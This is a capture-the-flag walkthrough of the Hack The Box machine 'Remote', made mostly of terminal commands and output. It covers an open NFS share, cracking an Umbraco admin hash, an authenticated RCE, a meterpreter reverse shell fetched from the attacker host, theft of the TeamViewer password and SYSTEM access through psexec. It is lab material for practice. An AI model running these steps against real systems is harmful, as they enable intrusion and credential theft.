Remote IP:10.10.10.180


rustscan:
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
80/tcp    open  http         syn-ack
111/tcp   open  rpcbind      syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49678/tcp open  unknown      syn-ack
49679/tcp open  unknown      syn-ack
49680/tcp open  unknown      syn-ack



nmap:

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54810/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 65287/udp): CLEAN (Timeout)
|   Check 4 (port 15893/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-13T10:12:03
|_  start_date: N/A


                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Remote]
└─$ showmount -e  10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)







gobuster dir  -u http://remote.htb  -w /usr/share/wordlists/dirb/common.txt -t 64  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://remote.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/02/13 05:11:23 Starting gobuster
===============================================================
/about-us (Status: 200)
/Blog (Status: 200)
/blog (Status: 200)
/Contact (Status: 200)
/contact (Status: 200)
/home (Status: 200)
/Home (Status: 200)
/install (Status: 302)
/intranet (Status: 200)
/people (Status: 200)
/People (Status: 200)
/person (Status: 200)
/Products (Status: 200)
/products (Status: 200)
/umbraco (Status: 200)
===============================================================
2023/02/13 05:12:09 Finished
===============================================================



so, we have umbraco as cms

there are some exploits found by searchsploit, but we need credentials:

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Remote]
└─$ searchsploit umbraco                       
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                                                                | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                         | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                         | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                                                                            | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                                                         | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                                                                                                   | aspx/webapps/50462.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------


time so see what is on the share


                                                                                                                                                                                                     
┌──(kali㉿kali)-[/mnt]
└─$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/remote/        


┌──(kali㉿kali)-[/mnt/remote]
└─$ ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config


navigating to App_data we find a file called umbraco.sdf. We use strings to search for "admin"

strings Umbraco.sdf| grep admin   
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f



we save the hash into a new file and then we crack it using john:


┌──(kali㉿kali)-[~/Practice/HackTheBox/Remote]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)     
1g 0:00:00:00 DONE (2023-02-13 05:34) 1.886g/s 18535Kp/s 18535Kc/s 18535KC/s baconandchipies1..bacon918
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 



now we have credentials for umbraco:  admin@local.htb / baconandcheese

found an exploit on github: https://github.com/noraj/Umbraco-RCE

POC

┌──(kali㉿kali)-[~/Documents/tools/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::e9
   IPv6 Address. . . . . . . . . . . : dead:beef::448:dc8:ec38:2bdc
   Link-local IPv6 Address . . . . . : fe80::448:dc8:ec38:2bdc%12
   IPv4 Address. . . . . . . . . . . : 10.10.10.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:ba76%12
                                       10.10.10.2

we can use it to list items:

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/tools/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "ls C:/"


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/20/2020   1:13 AM                ftp_transfer                                                          
d-----        2/19/2020   3:11 PM                inetpub                                                               
d-----        2/19/2020  11:09 PM                Microsoft                                                             
d-----        9/15/2018   3:19 AM                PerfLogs                                                              
d-r---         7/9/2021   7:41 AM                Program Files                                                         
d-----        2/23/2020   2:19 PM                Program Files (x86)                                                   
d-----        2/13/2023   5:06 AM                site_backups                                                          
d-r---        2/19/2020   3:12 PM                Users                                                                 
d-----        8/17/2021   9:34 AM                Windows                



create a reverse meterpreter shell: 
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Remote]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=9999 -f exe -o metr.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: metr.exe


host the file and try to save it in the ftp_transfer folder

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/tools/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "-NoP Invoke-WebRequest -Uri 'http://10.10.14.3/metr.exe' -OutFile 'C:/ftp_transfer/metr.exe'"

check if the file is saved:

                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/tools/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "ls C:/ftp_transfer"


    Directory: C:\ftp_transfer


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/13/2023   8:57 AM          73802 metr.exe                                                              


set up a listener and run the rev shell:


                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/tools/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "C:/ftp_transfer/metr.exe"


└─$ msfconsole -q                                                                            
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.3:9999 
[*] Sending stage (175686 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.3:9999 -> 10.10.10.180:49707) at 2023-02-13 07:59:43 -0500

meterpreter > 



meterpreter > ls
Listing: C:\Users\Public
========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040555/r-xr-xr-x  0     dir   2020-02-19 15:03:50 -0500  AccountPictures
040555/r-xr-xr-x  0     dir   2020-02-20 02:14:59 -0500  Desktop
040555/r-xr-xr-x  4096  dir   2020-02-19 15:03:20 -0500  Documents
040555/r-xr-xr-x  0     dir   2018-09-15 03:19:03 -0400  Downloads
040555/r-xr-xr-x  0     dir   2018-09-15 03:19:03 -0400  Libraries
040555/r-xr-xr-x  0     dir   2018-09-15 03:19:03 -0400  Music
040555/r-xr-xr-x  0     dir   2018-09-15 03:19:03 -0400  Pictures
040555/r-xr-xr-x  0     dir   2018-09-15 03:19:03 -0400  Videos
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-02-13 05:06:28 -0500  user.txt

meterpreter > cat user.txt
5074e382f18b7f3e335633f30e2023e6


PRIVESC:


meterpreter > cd "Program Files (x86)"
meterpreter > ls
Listing: C:\Program Files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  Common Files
040777/rwxrwxrwx  4096  dir   2018-09-15 05:06:02 -0400  Internet Explorer
040777/rwxrwxrwx  0     dir   2020-02-19 15:11:33 -0500  MSBuild
040777/rwxrwxrwx  4096  dir   2020-02-23 14:19:44 -0500  Microsoft SQL Server
040777/rwxrwxrwx  0     dir   2020-02-23 14:15:23 -0500  Microsoft.NET
040777/rwxrwxrwx  0     dir   2020-02-19 15:11:33 -0500  Reference Assemblies
040777/rwxrwxrwx  0     dir   2020-02-20 02:14:58 -0500  TeamViewer
040777/rwxrwxrwx  4096  dir   2018-09-15 05:05:40 -0400  Windows Defender
040777/rwxrwxrwx  0     dir   2018-09-15 03:19:03 -0400  Windows Mail
040777/rwxrwxrwx  4096  dir   2018-10-29 18:39:47 -0400  Windows Media Player
040777/rwxrwxrwx  0     dir   2018-09-15 03:19:03 -0400  Windows Multimedia Platform
040777/rwxrwxrwx  4096  dir   2018-10-29 18:39:47 -0400  Windows Photo Viewer
040777/rwxrwxrwx  0     dir   2018-09-15 03:19:03 -0400  Windows Portable Devices
040777/rwxrwxrwx  0     dir   2018-09-15 03:19:00 -0400  Windows Sidebar
040777/rwxrwxrwx  0     dir   2018-09-15 03:19:00 -0400  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  windows nt

meterpreter > 


we see that team viewer is installed:

we can use msfconsole module to get passwords:

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > back
msf6 > search team viewer

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  exploit/windows/browser/sapgui_saveviewtosessionfile  2009-03-31       normal  No     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
   1  auxiliary/server/teamviewer_uri_smb_redirect                           normal  No     TeamViewer Unquoted URI Handler SMB Redirect
   2  post/windows/gather/credentials/teamviewer_passwords                   normal  No     Windows Gather TeamViewer Passwords


Interact with a module by name or index. For example info 2, use 2 or use post/windows/gather/credentials/teamviewer_passwords

msf6 > use 2
msf6 post(windows/gather/credentials/teamviewer_passwords) > show options

Module options (post/windows/gather/credentials/teamviewer_passwords):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   SESSION                        yes       The session to run this module on
   WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer

msf6 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /home/kali/.msf4/loot/20230213080420_default_10.10.10.180_host.teamviewer__639611.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
[*] Post module execution completed


with this information we can use psexec to log in as administrator:

msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.180 
RHOSTS => 10.10.10.180
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.10.10.180:445 - Connecting to the server...
[*] 10.10.10.180:445 - Authenticating to 10.10.10.180:445 as user ''...
[-] 10.10.10.180:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: (0xc0000022) STATUS_ACCESS_DENIED: {Access Denied} A process has requested access to an object but has not been granted those access rights.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf6 exploit(windows/smb/psexec) > set SMBPass !R3m0te!
SMBPass => !R3m0te!
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.10.10.180:445 - Connecting to the server...
[*] 10.10.10.180:445 - Authenticating to 10.10.10.180:445 as user 'administrator'...
[*] 10.10.10.180:445 - Selecting PowerShell target
[*] 10.10.10.180:445 - Executing the payload...
[+] 10.10.10.180:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.10.180
[*] Meterpreter session 2 opened (10.10.14.3:4444 -> 10.10.10.180:49708) at 2023-02-13 08:07:19 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:/
meterpreter > cd Users
meterpreter > cd Administrator
meterpreter > ls
Listing: C:\Users\Administrator
===============================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:50 -0500  3D Objects
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  AppData
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  Application Data
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:50 -0500  Contacts
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  Cookies
040555/r-xr-xr-x  0        dir   2020-02-20 02:41:52 -0500  Desktop
040555/r-xr-xr-x  4096     dir   2020-02-19 16:26:44 -0500  Documents
040555/r-xr-xr-x  4096     dir   2020-02-23 13:22:33 -0500  Downloads
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:50 -0500  Favorites
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:51 -0500  Links
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  Local Settings
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:50 -0500  Music
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  My Documents
100666/rw-rw-rw-  3670016  fil   2023-02-13 05:06:33 -0500  NTUSER.DAT
100666/rw-rw-rw-  65536    fil   2020-02-19 15:05:03 -0500  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
100666/rw-rw-rw-  524288   fil   2020-02-19 15:03:39 -0500  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288   fil   2020-02-19 15:03:39 -0500  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  NetHood
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:50 -0500  Pictures
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  PrintHood
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  Recent
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:51 -0500  Saved Games
040555/r-xr-xr-x  0        dir   2020-02-20 00:45:40 -0500  Searches
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  SendTo
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  Start Menu
040777/rwxrwxrwx  0        dir   2020-02-19 15:03:39 -0500  Templates
040555/r-xr-xr-x  0        dir   2020-02-19 15:03:50 -0500  Videos
100666/rw-rw-rw-  897024   fil   2020-02-19 15:03:39 -0500  ntuser.dat.LOG1
100666/rw-rw-rw-  897024   fil   2020-02-19 15:03:39 -0500  ntuser.dat.LOG2
100666/rw-rw-rw-  20       fil   2020-02-19 15:03:39 -0500  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-02-19 15:03:50 -0500  desktop.ini
100444/r--r--r--  34    fil   2023-02-13 05:06:28 -0500  root.txt

meterpreter > cat root.txt
4fa2562a189a9b8ba5518ce8d0be2da3
meterpreter > 


Or we could use evil-winrm to log in as administrator:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Remote]
└─$ evil-winrm -i 10.10.10.180 -u administrator -p '!R3m0te!'                              

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/13/2023   5:06 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4fa2562a189a9b8ba5518ce8d0be2da3
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
